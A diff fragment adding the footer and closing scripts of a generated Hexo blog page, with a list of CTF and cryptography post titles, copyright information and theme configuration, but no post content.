+    <li class="next pjax">
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/16/tcache-stashing-unlink-attack/" title="tcache_stashing_unlink_attack">tcache_stashing_unlink_attack</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/07/Lucky-7-%E4%BA%8C%E5%85%83%E9%9D%9E%E7%BA%BF%E6%80%A7%E5%90%8C%E4%BD%99%E6%96%B9%E7%A8%8B%E7%BB%84/" title="Lucky 7 二元非线性同余方程组">Lucky 7 二元非线性同余方程组</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/02/21/idek2022%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/" title="idek2022部分复现">idek2022部分复现</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/02/%E5%BC%BA%E7%BD%91%E6%9D%AF-polydiv/" title="强网杯-polydiv">强网杯-polydiv</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/17/Misc1/" title="Misc1">Misc1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/05/08/hello-world/" title="Hello World">Hello World</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/13/Crypto%E5%A4%8D%E7%8E%B01/" title="Crypto复现1">Crypto复现1</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/09/23/BUU-Crypto/" title="BUU_Crypto">BUU_Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/27/%E7%BD%91%E9%BC%8E%E6%9D%AFre%E3%80%81Crypto/" title="网鼎杯re、Crypto">网鼎杯re、Crypto</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/08/24/%E9%95%BF%E5%9F%8E%E6%9D%AFCrypto/" title="长城杯Crypto">长城杯Crypto</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">岚沐 @ Arashimuのblog</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/10/04/Linux-Kernel-Pwn/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
